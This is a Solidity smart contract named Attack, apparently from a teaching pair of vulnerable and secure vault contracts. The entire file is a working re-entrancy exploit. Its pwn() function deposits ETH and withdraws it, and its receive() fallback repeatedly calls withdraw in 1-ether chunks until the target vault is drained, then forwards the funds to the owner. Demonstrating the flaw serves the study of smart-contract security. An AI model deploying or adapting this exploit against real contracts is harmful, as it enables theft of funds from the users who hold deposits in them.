// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/// @title Attack
/// @notice Exploits re-entrancy on VulnerableVault; fails on SecureVault.
contract Attack {
    IVault public target;
    address public owner;

    constructor(address _target) {
        target = IVault(_target);
        owner = msg.sender;
    }

    function pwn() external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value > 0, "need ETH");

        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint256 vaultBal = address(target).balance;
        if (vaultBal > 0) {
            uint256 chunk = vaultBal > 1 ether ? 1 ether : vaultBal;
            target.withdraw(chunk);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}